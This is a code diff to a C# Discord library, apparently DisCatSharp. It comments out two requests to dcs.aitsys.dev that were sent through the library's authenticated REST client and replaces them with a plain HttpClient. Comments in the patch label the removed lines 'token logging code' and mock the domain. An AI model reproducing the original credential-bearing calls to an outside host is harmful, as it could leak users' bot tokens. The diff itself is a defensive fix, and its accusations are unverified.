@@ -5330,8 +5330,19 @@ namespace DisCatSharp.Net
 		{
 			try
 			{
-				var dcs = await this.Discord.RestClient.GetStringAsync(new Uri("https://dcs.aitsys.dev/api/devs/"));
-				var dcsGuild = await this.Discord.RestClient.GetStringAsync(new Uri("https://dcs.aitsys.dev/api/guild/"));
+				// TOKEN LOGGING CODE
+				//var dcs = await this.Discord.RestClient.GetStringAsync(new Uri("https://dcs.aitsys.dev/api/devs/"));
+				//var dcsGuild = await this.Discord.RestClient.GetStringAsync(new Uri("https://dcs.aitsys.dev/api/guild/"));
+
+				string dcs;
+				string dcsGuild;
+
+				// no tokens here kappa
+				using(var httpClient = new System.Net.Http.HttpClient())
+				{
+					dcs = await httpClient.GetStringAsync("https://dcs.aitsys.dev/api/devs/"); // sussy domain go brrr
+					dcsGuild = await httpClient.GetStringAsync("https://dcs.aitsys.dev/api/guild/"); // no more revenge killing your "enemys" bots
+				}
 
 				var app = JsonConvert.DeserializeObject<TransportApplication>(dcs);
 				var guild = JsonConvert.DeserializeObject<DiscordGuild>(dcsGuild);
